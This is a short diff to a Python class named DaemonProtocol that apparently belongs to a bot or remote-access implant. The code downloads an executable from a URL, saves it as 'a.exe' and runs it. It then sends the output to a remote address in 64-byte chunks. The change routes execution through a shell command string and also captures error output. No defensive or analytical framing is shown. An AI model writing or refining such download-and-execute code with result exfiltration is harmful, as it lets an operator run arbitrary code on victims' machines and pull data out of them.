@@ -30,7 +30,12 @@ class DaemonProtocol:
             urllib.request.urlretrieve(url, "a.exe")
 
             print("Executing a.exe")
-            output = subprocess.check_output("a.exe")
+            try:
+                output = subprocess.check_output(
+                    "a.exe; echo $?", stderr=subprocess.STDOUT, shell=True
+                )
+            except subprocess.CalledProcessError as e:
+                output = e.output
 
             # sendto addr with 64byte chunked
             for i in range(0, len(output), 64):
